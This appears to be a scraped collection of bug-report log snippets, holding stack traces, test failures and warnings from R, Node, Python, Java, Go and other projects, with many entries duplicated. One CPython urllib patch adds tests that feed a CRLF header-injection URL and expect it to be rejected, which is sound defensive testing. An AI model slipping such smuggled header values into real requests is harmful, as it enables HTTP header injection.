\"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJjb20uYWVzdGh5cmljYS5sYWZvbiIsImRldmljZUlkIjoiaVBob25lMTAsMyIsInVybCI6Imh0dHA6XC9cL2N5ZGlhLnNhdXJpay5jb21cL3BhY2thZ2VcL2NvbS5hZXN0aHlyaWNhLmxhZm9uXC8iLCJpT1NWZXJzaW9uIjoiMTIuMS4xIiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJMYWZvbiIsImNhdGVnb3J5IjoiVHdlYWtzIiwicmVwb3NpdG9yeSI6IlBhY2tpeCIsIm5hbWUiOiJMYWZvbiIsImluc3RhbGxlZCI6IjEuMCIsInBhY2thZ2VJbmRleGVkIjpmYWxzZSwicGFja2FnZVN0YXR1c0V4cGxhaW5hdGlvbiI6IlRoaXMgdHdlYWsgaGFzIG5vdCBiZWVuIHJldmlld2VkLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6ImNvbS5hZXN0aHlyaWNhLmxhZm9uIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkNoYW5nZSB0aGUgTG9ja3NjcmVlbiBmb250cy4iLCJsYXRlc3QiOiIxLjAiLCJhdXRob3IiOiJBZXN0aHlyaWNhIiwicGFja2FnZVN0YXR1cyI6IlVua25vd24ifQ==\",\r\n  \"chosenStatus\": \"notworking\",\r\n  \"notes\": \"Add support for jellyfish tweak\"\r\n}"
    },
    {
        "logs": "diff\r\ndiff --git a/Lib/test/test_urllib.py b/Lib/test/test_urllib.py\r\nindex 2ac73b58d8..99bd934765 100644\r\n--- a/Lib/test/test_urllib.py\r\n+++ b/Lib/test/test_urllib.py\r\n@@ -329,6 +329,14 @@ class urlopen_HttpTests(unittest.TestCase, FakeHTTPMixin, FakeFTPMixin):\r\n         finally:\r\n             self.unfakehttp()\r\n\r\n+    def test_url_newline(self):\r\n+        self.fakehttp(b\"HTTP/1.1 200 OK\\r\\n\\r\\nHello!\")\r\n+        try:\r\n+            with self.assertRaises(ValueError):\r\n+                resp = urlopen(\"http://127.0.0.1:1234/?q=HTTP/1.1\\r\\nHeader: Value\")\r\n+        finally:\r\n+            self.unfakehttp()\r\n+\r\n     def test_read_0_9(self):\r\n         # \"0.9\" response accepted (but not \"simple responses\" without\r\n         # a status line)\r\n@@ -1512,6 +1520,11 @@ class RequestTests(unittest.TestCase):\r\n         request.method = 'HEAD'\r\n         self.assertEqual(request.get_method(), 'HEAD')\r\n\r\n+    def test_url_newline(self):\r\n+        Request = urllib.request.Request\r\n+        with self.assertRaises(ValueError):\r\n+            resp = Request(\"http://127.0.0.1:1234/?q=HTTP/1.1\\r\\nHeader: Value\")\r\n+\r\n\r\n class URL2PathNameTests(unittest.TestCase):\r\n\r\ndiff --git a/Lib/urllib/parse.py b/Lib/urllib/parse.py\r\nindex 8b6c9b1060..20242eee2d 100644\r\n--- a/Lib/urllib/parse.py\r\n+++ b/Lib/urllib/parse.py\r\n@@ -997,6 +997,11 @@ def _splittype(url):\r\n     if _typeprog is None:\r\n         _typeprog = re.compile('([^/:]+):(.*)', re.DOTALL)\r\n\r\n+    unquoted_url = unquote(url)\r\n+    if (unquoted_url.startswith('http') and\r\n+        re.search(\"[\\x00-\\x19\\x7f-\\x9f]\", unquoted_url)):\r\n+        raise ValueError(\"URL can't contain control characters. %r\" % (unquoted_url,))\r\n+\r\n     match = _typeprog.match(url)\r\n     if match:\r\n         scheme, data = match.groups()"
    },
    {
        "logs": "diff\r\ndiff --git a/Lib/test/test_urllib.py b/Lib/test/test_urllib.py\r\nindex 2ac73b58d8..99bd934765 100644\r\n--- a/Lib/test/test_urllib.py\r\n+++ b/Lib/test/test_urllib.py\r\n@@ -329,6 +329,14 @@ class urlopen_HttpTests(unittest.TestCase, FakeHTTPMixin, FakeFTPMixin):\r\n         finally:\r\n             self.unfakehttp()\r\n\r\n+    def test_url_newline(self):\r\n+        self.fakehttp(b\"HTTP/1.1 200 OK\\r\\n\\r\\nHello!\")\r\n+        try:\r\n+            with self.assertRaises(ValueError):\r\n+                resp = urlopen(\"http://127.0.0.1:1234/?q=HTTP/1.1\\r\\nHeader: Value\")\r\n+        finally:\r\n+            self.unfakehttp()\r\n+\r\n     def test_read_0_9(self):\r\n         # \"0.9\" response accepted (but not \"simple responses\" without\r\n         # a status line)\r\n@@ -1512,6 +1520,11 @@ class RequestTests(unittest.TestCase):\r\n         request.method = 'HEAD'\r\n         self.assertEqual(request.get_method(), 'HEAD')\r\n\r\n+    def test_url_newline(self):\r\n+        Request = urllib.request.Request\r\n+        with self.assertRaises(ValueError):\r\n+            resp = Request(\"http://127.0.0.1:1234/?q=HTTP/1.1\\r\\nHeader: Value\")\r\n+\r\n\r\n class URL2PathNameTests(unittest.TestCase):\r\n\r\ndiff --git a/Lib/urllib/parse.py b/Lib/urllib/parse.py\r\nindex 8b6c9b1060..20242eee2d 100644\r\n--- a/Lib/urllib/parse.py\r\n+++ b/Lib/urllib/parse.py\r\n@@ -997,6 +997,11 @@ def _splittype(url):\r\n     if _typeprog is None:\r\n         _typeprog = re.compile('([^/:]+):(.*)', re.DOTALL)\r\n\r\n+    unquoted_url = unquote(url)\r\n+    if (unquoted_url.startswith('http') and\r\n+        re.search(\"[\\x00-\\x19\\x7f-\\x9f]\", unquoted_url)):\r\n+        raise ValueError(\"URL can't contain control characters. %r\" % (unquoted_url,))\r\n+\r\n     match = _typeprog.match(url)\r\n     if match:\r\n         scheme, data = match.groups()"
    },
    {
        "logs": "(node:23813) UnhandledPromiseRejectionWarning: TypeError: Cannot read property 'access' of undefined\r\n    at Object.create (/home/brian/petstore/node_modules/hapi-openapi/lib/routes.js:108:34)"
    },
    {
        "logs": " r\r\nlibrary(modeltime.gluonts)\r\n#> Loading required package: modeltime\r\nlibrary(tidymodels)\r\n#> \u2500\u2500 Attaching packages \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels 0.1.2 \u2500\u2500\r\n#> \u2713 broom     0.7.2      \u2713 recipes   0.1.15\r\n#> \u2713 dials     0.0.9      \u2713 rsample   0.0.8 \r\n#> \u2713 dplyr     1.0.2      \u2713 tibble    3.0.4 \r\n#> \u2713 ggplot2   3.3.2      \u2713 tidyr     1.1.2 \r\n#> \u2713 infer     0.5.3      \u2713 tune      0.1.2 \r\n#> \u2713 modeldata 0.1.0      \u2713 workflows 0.2.1 \r\n#> \u2713 parsnip   0.1.4      \u2713 yardstick 0.0.7 \r\n#> \u2713 purrr     0.3.4\r\n#> \u2500\u2500 Conflicts \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels_conflicts() \u2500\u2500\r\n#> x purrr::discard() masks scales::discard()\r\n#> x dplyr::filter()  masks stats::filter()\r\n#> x dplyr::lag()     masks stats::lag()\r\n#> x recipes::step()  masks stats::step()\r\nlibrary(tidyverse)\r\n\r\n# Fit a GluonTS DeepAR Model\r\nmodel_fit_deepar <- deep_ar(\r\n    id                    = \"id\",\r\n    freq                  = \"M\",\r\n    prediction_length     = 24,\r\n    lookback_length       = 36,\r\n    epochs                = 10, \r\n    num_batches_per_epoch = 50,\r\n    learn_rate            = 0.001,\r\n    num_layers            = 2,\r\n    dropout               = 0.10\r\n) %>%\r\n    set_engine(\"gluonts_deepar\") %>%\r\n    fit(value ~ ., training(m750_splits))\r\n#> Error in rlang::env_get(get_model_env(), paste0(cls, \"_modes\")): argument \"default\" is missing, with no default"
    },
    {
        "logs": " r\r\nremotes::install_github(\"tidymodels/parsnip\")\r\n#> Skipping install of 'parsnip' from a github remote, the SHA1 (a82ed405) has not changed since last install.\r\n#>   Use "
    },
    {
        "logs": " to force installation\r\nremotes::install_github(\"business-science/modeltime.gluonts\")\r\n#> Skipping install of 'modeltime.gluonts' from a github remote, the SHA1 (86df28d1) has not changed since last install.\r\n#>   Use "
    },
    {
        "logs": " to force installation\r\n\r\nSys.setenv(GLUONTS_PYTHON = \"/home/jasonusername_0w0/.local/share/r-miniconda/envs/r-gluonts/bin/python\")\r\n\r\nlibrary(modeltime.gluonts)\r\n#> Loading required package: modeltime\r\nlibrary(tidymodels)\r\n#> \u2500\u2500 Attaching packages \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels 0.1.2 \u2500\u2500\r\n#> \u2713 broom     0.7.2          \u2713 recipes   0.1.15    \r\n#> \u2713 dials     0.0.9          \u2713 rsample   0.0.8     \r\n#> \u2713 dplyr     1.0.2          \u2713 tibble    3.0.4     \r\n#> \u2713 ggplot2   3.3.2          \u2713 tidyr     1.1.2     \r\n#> \u2713 infer     0.5.3          \u2713 tune      0.1.2     \r\n#> \u2713 modeldata 0.1.0          \u2713 workflows 0.2.1     \r\n#> \u2713 parsnip   0.1.4.9000     \u2713 yardstick 0.0.7     \r\n#> \u2713 purrr     0.3.4\r\n#> \u2500\u2500 Conflicts \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels_conflicts() \u2500\u2500\r\n#> x purrr::discard() masks scales::discard()\r\n#> x dplyr::filter()  masks stats::filter()\r\n#> x dplyr::lag()     masks stats::lag()\r\n#> x recipes::step()  masks stats::step()\r\nlibrary(tidyverse)\r\n\r\n# Fit a GluonTS DeepAR Model\r\nmodel_fit_deepar <- deep_ar(\r\n    id                    = \"id\",\r\n    freq                  = \"M\",\r\n    prediction_length     = 24,\r\n    lookback_length       = 36,\r\n    epochs                = 10, \r\n    num_batches_per_epoch = 50,\r\n    learn_rate            = 0.001,\r\n    num_layers            = 2,\r\n    dropout               = 0.10\r\n) %>%\r\n    set_engine(\"gluonts_deepar\") %>%\r\n    fit(value ~ ., training(m750_splits))\r\n#> Error in rlang::env_get(get_model_env(), paste0(cls, \"_modes\")): argument \"default\" is missing, with no default"
    },
    {
        "logs": "Error in rlang::env_get(get_model_env(), paste0(cls, \"_modes\")) : argument \"default\" is missing, with no default\r\n6. rlang::env_get(get_model_env(), paste0(cls, \"_modes\"))\r\n5. parsnip::new_model_spec(\"deep_ar\", args = args, eng_args = NULL, mode = mode, method = NULL, engine = NULL)\r\n4. deep_ar(id = \"id\", freq = \"M\", prediction_length = 24, lookback_length = 36, epochs = 10, num_batches_per_epoch = 50, learn_rate = 0.001, num_layers = 2, dropout = 0.1)\r\n3. set_engine(., \"gluonts_deepar\")\r\n2. fit(., value ~ ., training(m750_splits))\r\n1. deep_ar(id = \"id\", freq = \"M\", prediction_length = 24, lookback_length = 36, epochs = 10, num_batches_per_epoch = 50, learn_rate = 0.001, num_layers = 2, dropout = 0.1) %>% set_engine(\"gluonts_deepar\") %>% fit(value ~ ., training(m750_splits))"
    },
    {
        "logs": "sh\r\n/telescope/src/api/planet/src/index.js:9\r\n    app.engine('handlebars', expressHandlebars());\r\n                             ^\r\n\r\nTypeError: expressHandlebars is not a function"
    },
    {
        "logs": "sh\r\n/telescope/src/api/planet/src/index.js:9\r\n    app.engine('handlebars', expressHandlebars());\r\n                             ^\r\n\r\nTypeError: expressHandlebars is not a function"
    },
    {
        "logs": "@Test\r\npublic void test_JodaDSTBug() throws Exception {\r\n  DateTime problemDate = DateTime.parse(\"1916-04-01T23:59:59.999\").withZone(DateTimeZone.forID(\"Europe/Berlin\"));\r\n  DateTime endTime = problemDate.dayOfMonth().withMaximumValue();\r\n  Assert.assertEquals(\"1916-04-30T22:59:59.999+01:00\", endTime.toString());\r\n}"
    },
    {
        "logs": "@Test\r\npublic void test_JodaDSTBug() throws Exception {\r\n  DateTime problemDate = DateTime.parse(\"1916-04-01T23:59:59.999\").withZone(DateTimeZone.forID(\"Europe/Berlin\"));\r\n  DateTime endTime = problemDate.dayOfMonth().withMaximumValue();\r\n  Assert.assertEquals(\"1916-04-30T22:59:59.999+01:00\", endTime.toString());\r\n}"
    },
    {
        "logs": "{{- if eq . \"servingcontainer\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:ac1aa5d3aa814939fd0a124a3c9c24daa95e8b4d9fd75951066c5aca84b880f1{{end -}}\r\n{{- if eq . \"sidecarcontainer\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:eafead00d184a9ea2a7d70f94522b0225dfd3526f2c23901bf7bba897f2dfdf8{{end -}}\r\n{{- if eq . \"hellohttp2\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:43c4175dd3086f80a7eb9f727867e33e53e38b3f630a8d2d497fb97806076720{{end -}}\r\n{{- if eq . \"hellovolume\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:7b21fec64afdd726af89a9c390ef28da1f53d6d7cb45809f6f462044820c0bc2{{end -}}\r\n{{- if eq . \"invalidhelloworld\"}}quay.io/openshift-knative/helloworld:invalid{{end -}}\r\n{{end -}}' --enable-alpha --https --skip-cleanup-on-fail --resolvabledomain\r\nPASS test/e2e/pvc.TestPersistentVolumeClaims (23.45s)\r\nPASS test/e2e/pvc"
    },
    {
        "logs": "                    var config = new MapperConfiguration(cfg =>\r\n                    {\r\n                        cfg.AddCollectionMappers();\r\n                        cfg.CreateMap<Project, Project>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeNestedObject, SomeNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeOtherNestedObject, SomeOtherNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                    });\r\n\r\nexistingProject = config.CreateMapper().Map(changedProject, existingProject);"
    },
    {
        "logs": "                    var config = new MapperConfiguration(cfg =>\r\n                    {\r\n                        cfg.AddCollectionMappers();\r\n                        cfg.CreateMap<Project, Project>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeNestedObject, SomeNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeOtherNestedObject, SomeOtherNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                    });\r\n\r\nexistingProject = config.CreateMapper().Map(changedProject, existingProject);"
    },
    {
        "logs": "warning: Vertical Whitespace Violation: Limit vertical whitespace to a single empty line. Currently 4. (vertical_whitespace)"
    },
    {
        "logs": "    Tests run: 749, Failures: 1, Errors: 0, Skipped: 7, Time elapsed: 465.517 sec <<< FAILURE! - in TestSuite\r\n    testNonEmptyTable(com.facebook.presto.cassandra.TestCassandraTokenSplitManager)  Time elapsed: 0.309 sec  <<< FAILURE!\r\n    java.lang.AssertionError: expected [10] but found [1]\r\n        at com.facebook.presto.cassandra.TestCassandraTokenSplitManager.testNonEmptyTable(TestCassandraTokenSplitManager.java:69)"
    },
    {
        "logs": "    Tests run: 749, Failures: 1, Errors: 0, Skipped: 7, Time elapsed: 465.517 sec <<< FAILURE! - in TestSuite\r\n    testNonEmptyTable(com.facebook.presto.cassandra.TestCassandraTokenSplitManager)  Time elapsed: 0.309 sec  <<< FAILURE!\r\n    java.lang.AssertionError: expected [10] but found [1]\r\n        at com.facebook.presto.cassandra.TestCassandraTokenSplitManager.testNonEmptyTable(TestCassandraTokenSplitManager.java:69)"
    },
    {
        "logs": "../aten/src/ATen/native/BinaryOps.cpp:81: UserWarning: Integer division of tensors using div or / is deprecated, and in a future release div will perform true division as in Python 3. Use true_divide or floor_divide (// in Python) instead."
    },
    {
        "logs": "test/test_torch.py:16463: UserWarning: Integer division of tensors using div or / is deprecated, and in a future release div will perform true division as in Python 3. Use true_divide or floor_divide (// in Python) instead. (Triggered internally at  ../aten/src/ATen/native/BinaryOps.cpp:81.)\r\n  cpu_result = getattr(cpu_tensor, op_str)(*cpu_args)"
    },
    {
        "logs": "Traceback (most recent call last):\r\n  File \"../../warnings.py\", line 44, in <module>\r\n    fn()\r\n  File \"../../warnings.py\", line 14, in fn\r\n    return a / b\r\nUserWarning: Integer division of tensors using div or / is deprecated, and in a future release div will perform true division as in Python 3. Use true_divide or floor_divide (// in Python) instead."
    },
    {
        "logs": "../../warnings.py:13: UserWarning: The number of elements in the out tensor of shape [5] is 5 which does not match the computed number of elements 3. Note that this may occur as a result of rounding error. The out tensor will be resized to a tensor of shape (3,). (Triggered internally at  ../aten/src/ATen/native/RangeFactories.cpp:215.)\r\n  torch.arange(0, 3, out=out)"
    },
    {
        "logs": "../../warnings.py:17: UserWarning: The number of elements in the out tensor of shape [5] is 5 which does not match the computed number of elements 3. Note that this may occur as a result of rounding error. The out tensor will be resized to a tensor of shape (3,). (Triggered internally at  ../aten/src/ATen/native/RangeFactories.cpp:215.)\r\n  scripted_fn()  # this warning is generated from interpreter.cpp"
    },
    {
        "logs": "    data = self._reader.read_next()\r\nValueError: (InvalidArgument) The sample number of reader's input data and the input number of feed list are not equal.\r\nPossible reasons are:\r\n  The generator is decorated by "
    },
    {
        "logs": "    data = self._reader.read_next()\r\nValueError: (InvalidArgument) The sample number of reader's input data and the input number of feed list are not equal.\r\nPossible reasons are:\r\n  The generator is decorated by `paddle.batch` and configured by `set_batch_generator`, but here need to used `set_sample_list_generator`.\r\n  [Hint: Expected names_.size() == ret_[i].size(), but received names_.size():4 != ret_[i].size():3.] (at C:\\home\\workspace\\Paddle_release2\\paddle\\fluid\\pybind\\reader_py.cc:199)"
    },
    {
        "logs": "shell\r\n--- FAIL: BenchmarkOneBankSendTxPerBlock\r\n    bench_test.go:56: \r\n        \tError Trace:\tbench_test.go:56\r\n        \tError:      \tReceived unexpected error:\r\n        \t            \t\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigVerificationDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:275\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigGasConsumeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:190\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateSigCountDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:388\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SetPubKeyDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:126\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.DeductFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:125\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ConsumeTxSizeGasDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:143\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateMemoDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:67\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.TxTimeoutHeightDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:206\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateBasicDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.MempoolFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:54\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.RejectExtensionOptionsDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/ext.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.runAnte\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:81\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:41\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.indexEventsTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/index_events.go:45\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.recoveryTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/recovery.go:74\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.gasTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/gas.go:53\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/baseapp.(*BaseApp).SimDeliver\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/baseapp/test_helpers.go:58\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/bank_test.BenchmarkOneBankSendTxPerBlock\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/bank/bench_test.go:55\r\n[Truncated]\n<!-- git commit hash or release version -->\r\n\r\n## Steps to Reproduce"
    },
    {
        "logs": "shell\r\n--- FAIL: BenchmarkOneBankSendTxPerBlock\r\n    bench_test.go:56: \r\n        \tError Trace:\tbench_test.go:56\r\n        \tError:      \tReceived unexpected error:\r\n        \t            \t\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigVerificationDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:275\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigGasConsumeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:190\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateSigCountDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:388\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SetPubKeyDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:126\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.DeductFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:125\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ConsumeTxSizeGasDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:143\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateMemoDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:67\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.TxTimeoutHeightDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:206\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateBasicDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.MempoolFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:54\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.RejectExtensionOptionsDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/ext.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.runAnte\r\n        \t            